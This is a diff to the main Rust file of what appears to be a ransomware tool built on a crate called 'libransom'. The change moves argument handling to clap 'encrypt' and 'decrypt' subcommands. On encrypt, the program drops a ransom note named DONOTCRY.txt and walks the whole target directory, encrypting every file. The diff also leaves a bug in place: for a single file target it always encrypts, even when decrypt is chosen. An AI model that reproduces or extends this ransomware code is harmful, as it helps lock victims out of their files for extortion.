@@ -1,40 +1,77 @@
-use libransom::encrypt_or_decrypt;
-use std::{env, fs};
+use clap::{arg, command, Command};
+use std::fs;
 use walkdir::WalkDir;
 
-fn main() {
-    let args: Vec<_> = env::args().collect();
+pub use libransom::{decrypt, encrypt};
 
-    if args.len() != 3 {
-        println!(
-            "Not enough arguments!\nUsage: {} <encrypt|decrypt> <folder>",
-            args[0].clone()
-        );
-        return;
+fn main() {
+    let matches = command!()
+        .subcommand(
+            Command::new("encrypt")
+                .about("Encrypt a target: file or directory")
+                .arg(arg!(<target> "Target directory or file to encrypt")),
+        )
+        .subcommand(
+            Command::new("decrypt")
+                .about("Decrypt a target: file or directory")
+                .arg(arg!(<target> "Target directory or file to encrypt")),
+        )
+        .get_matches();
+
+    let mut filename: &str = "default";
+    let mut action: &str = "default";
+    let mut encrypt_or_decrypt = false;
+
+    if let Some(matches) = matches.subcommand_matches("encrypt") {
+        filename = matches
+            .get_raw("target")
+            .expect("target is required")
+            .next()
+            .unwrap()
+            .to_str()
+            .unwrap();
+
+        // Create DONOTCRY.txt file
+        let readme_msg = include_str!("../res/DONOTCRY.txt");
+        let readme_path = if fs::metadata(filename).unwrap().is_file() {
+            String::from("DONOTCRY.txt")
+        } else {
+            format!("{}/DONOTCRY.txt", filename)
+        };
+
+        fs::write(readme_path, readme_msg).unwrap();
+
+        action = "encrypt";
+        encrypt_or_decrypt = true;
     }
 
-    // Create DONOTCRY.txt file
-    let readme_msg = include_str!("../res/DONOTCRY.txt");
-    let readme_path = if fs::metadata(args[2].clone()).unwrap().is_file() {
-        String::from("DONOTCRY.txt")
-    } else {
-        format!("{}/DONOTCRY.txt", args[2].clone())
-    };
+    if let Some(matches) = matches.subcommand_matches("decrypt") {
+        filename = matches
+            .get_raw("target")
+            .expect("target is required")
+            .next()
+            .unwrap()
+            .to_str()
+            .unwrap();
+        action = "decrypt";
+        encrypt_or_decrypt = true;
+    }
 
-    fs::write(readme_path, readme_msg).unwrap();
-
-    // Check if the input is a file or a directory
-    if fs::metadata(args[2].clone()).unwrap().is_dir() {
-        // let entries = fs::read_dir(args[2].clone()).unwrap();
-
-        // Iterate over files and directories inside a directory and encrypt or decrypt them
-        for entry in WalkDir::new(args[2].clone()).into_iter().filter_map(|e| e.ok()) {
-
-            if entry.file_type().is_file() {
-                encrypt_or_decrypt(entry.path().to_str().unwrap(), args[1].clone().as_str());
+    if encrypt_or_decrypt {
+        // Check if the input is a file or a directory
+        if fs::metadata(filename).unwrap().is_dir() {
+            // Iterate over files and directories inside a directory and encrypt or decrypt them
+            for entry in WalkDir::new(filename).into_iter().filter_map(|e| e.ok()) {
+                if entry.file_type().is_file() {
+                    if action == "encrypt" {
+                        encrypt(entry.path().to_str().unwrap());
+                    } else if action == "decrypt" {
+                        decrypt(entry.path().to_str().unwrap());
+                    }
+                }
             }
+        } else {
+            encrypt(filename);
         }
-    } else {
-        encrypt_or_decrypt(args[2].clone().as_str(), args[1].clone().as_str());
     }
 }
